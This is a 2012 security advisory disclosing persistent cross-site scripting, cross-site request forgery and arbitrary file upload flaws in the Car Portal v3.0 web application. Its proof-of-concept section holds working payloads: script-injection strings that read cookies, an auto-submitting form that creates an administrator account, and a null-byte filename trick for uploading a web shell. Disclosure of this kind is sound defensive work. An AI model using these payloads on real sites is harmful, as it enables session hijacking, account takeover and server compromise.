Abstract:
=========
The Vulnerability Laboratory Research Team discovered multiple Web Vulnerabilities in the Car Portal v3.0 web application.

Report-Timeline:
================
2012-04-24:	Public or Non-Public Disclosure

Status:
========
Published

Exploitation-Technique:
=======================
Remote

Severity:
=========
Medium

Details:
========
1.1
Multiple persistent input validation vulnerabilities are detected in the car portal v3.0 web application.
The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent).
Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent)
context manipulation. Exploitation requires low user inter action.

Vulnerable Module(s):
[+] Post a new vehicle - PWRS & Description field
[+] Create News - News title
[+] Create a sub user - Name
[+] Create new user group - group Name
[+] Change profile - Dealer name &First Name & Last Name

1.2
Multiple cross site request forgery vulnerabilities are detected in the car portal v3.0 web application.
The bugs allow remote attackers to enforce the user (admin) to change user`s password, Create a user, sub user, or change profile information
Successful exploitation of the vulnerability can lead to creating a new admin account or changing user`s password.

Vulnerable Module(s):
[+] cars/ADMIN/index.php?category=security&action=nouveau
[+] USERS/index.php?category=profile&action=edit
[+] USERS/index.php?category=home&action=sub_accounts

1.3
Arbitrary file upload allows the attacker to upload files that differs than images. The attacker can upload the file by
changing its name from file.php to file.php%00.php. After the uploading the file .jpg of the file will be truncated and the
file will save on the sever as file.php.
Successful exploitation can result in malware or malicious web shell upload which results in a system comrpomise at the end.

Proof of Concept:
=================
The vulnerabilities can be exploited by remote attackers with required low & high required user inter action.
For demonstration or reproduce ...

1.1
The issue can be exploited by creating news, new sub user, or new group with script code as value.
The result is the persistent execution out of the web application context.

Strings: >"<<iframe src=http://xxxxx.com/>3</iframe> ... or >"<script>alert(document.cookie)</script><div style="1

1.2
The issue can be exploited if the admin has entered to a page that has the following code. The user or the admin would be forced to do the vulnerable action.

<html>
<body onload="javascript:document.forms[0].submit()">
<form method="POST" name="form0" action="http://www.officialdemos.com/cars/ADMIN/index.php?category=secur
ity&action=nouveau">
<input type="hidden" name="username" value="the_storm"/>
<input type="hidden" name="password" value="password"/>
<input type="hidden" name="email" value="email (at) email (dot) com [email concealed]"/>
<input type="hidden" name="category" value="security" />
<input type="hidden" name="action" value="nouveau" />
<input type="hidden" name="type" value="administrator"/>
</form>
</body>
</html>

1.3
The attacker can exploit this vulnerability by uploading the file with name
file.php%00.jpg instead of file.php

Risk:
=====
1.1
The security risk of the persistent input validation vulnerability is estimated as medium(+).

1.2
The security risk of the cross site request forgery vulnerability is estimated as low.

1.3
The security risk of the arbitrary file upload vulnerability is estimated as medium(+).
